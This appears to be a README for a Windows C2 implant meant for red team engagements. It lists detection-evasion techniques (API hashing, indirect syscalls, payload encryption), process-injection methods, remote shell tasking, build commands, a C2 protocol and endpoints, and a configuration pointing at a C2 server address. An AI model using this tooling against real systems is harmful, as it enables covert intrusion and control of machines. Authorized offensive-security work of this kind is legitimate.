# PhantomImplant

Native C Windows implant for [Phantom C2](https://github.com/phantom-offensive/phantom). Designed for authorized red team engagements.

## Features

- **Zero IAT footprint** — Custom GetProcAddress/GetModuleHandle via Jenkins hashing
- **Indirect syscalls** — Hell's Gate + TartarusGate + HellsHall (jmp to ntdll)
- **AES-256-CBC/GCM encryption** — Payload obfuscation + C2 session crypto
- **XOR encryption** — Fast string/payload obfuscation (3 variants)
- **5 injection techniques** — Classic, Syscall-based, Early Bird APC, Local exec
- **Full Phantom C2 protocol** — RSA-OAEP key exchange, AES-256-GCM sessions, msgpack serialization
- **Task execution** — Shell commands, sysinfo, sleep updates, self-destruct
- **Cross-compiled from WSL** — MinGW + NASM, no Visual Studio required

## Architecture

```
phantom-implant/
├── include/
│   ├── common.h        # Types, 40+ precomputed hashes, syscall structures
│   ├── api.h           # GetProcAddressH + GetModuleHandleH
│   ├── syscalls.h      # HellsHall indirect syscalls
│   ├── crypto.h        # XOR + AES-256-CBC
│   ├── injection.h     # 5 injection techniques
│   ├── transport.h     # C2 protocol + task structures
│   └── msgpack.h       # Minimal msgpack decoder
├── src/
│   ├── api.c           # PEB walking, export table, Jenkins hashing
│   ├── syscalls.c      # Hell's Gate + TartarusGate + indirect syscalls
│   ├── crypto.c        # XOR (3 variants) + AES encrypt/decrypt (bCrypt)
│   ├── injection.c     # Classic, Syscall, Early Bird APC, Local exec
│   ├── transport.c     # WinHTTP C2 comms, Phantom protocol
│   ├── msgpack.c       # Msgpack parser for server responses
│   ├── hashgen.c       # Hash generator utility
│   └── main.c          # Entry point + test harness
├── asm/
│   └── syscalls.asm    # NASM x64 indirect syscall stubs
├── Makefile
└── README.md
```

## Build (from WSL/Linux)

```bash
# Prerequisites
sudo apt install nasm mingw-w64

# Generate API hashes (if changing seed)
make gen-hashes

# Build implant
make all
# Output: build/phantom-implant.exe (318 KB, x64 PE)
```

## Build (from Windows/MSVC)

```cmd
ml64 /c /Fo build\syscalls.obj asm\syscalls.asm
cl /O2 /Iinclude src\*.c build\syscalls.obj /Fe:build\phantom-implant.exe /link bcrypt.lib winhttp.lib crypt32.lib ntdll.lib
```

## Configuration

Edit `src/main.c` before building:

```c
#define C2_SERVER_URL   "http://172.20.41.154:8080"   // Your C2 server
#define C2_SLEEP_MS     10000                          // Check-in interval
#define C2_JITTER_PCT   20                             // Jitter percentage
```

The server's RSA public key is embedded as DER bytes in `g_ServerPubKeyDer[]`.

## Phantom C2 Protocol

```
Registration:  RSA-OAEP-SHA256 key exchange → AES-256-GCM session
Check-in:      AES-256-GCM encrypted envelopes over HTTP/HTTPS
Wire format:   JSON { "data": "<base64(envelope)>", "ts": <unix> }
Envelope:      [Version:1][Type:1][KeyID:8][PayloadLen:4][Payload:N]
Serialization: MessagePack (binary, compact)
Endpoints:     POST /api/v1/auth (register), POST /api/v1/status (check-in)
```

## MalDev Academy Techniques Used

| Module | Technique |
|--------|-----------|
| 53-55  | Custom GetProcAddress/GetModuleHandle + API Hashing |
| 63, 66 | Syscalls introduction + Hell's Gate |
| 89     | Indirect Syscalls (HellsHall) |
| 17     | XOR Encryption (3 variants) |
| 19     | AES-256-CBC via bCrypt |
| 29     | Remote Shellcode Injection |
| 40     | Early Bird APC Injection |

## Disclaimer

For authorized security testing only. Unauthorized use is illegal.
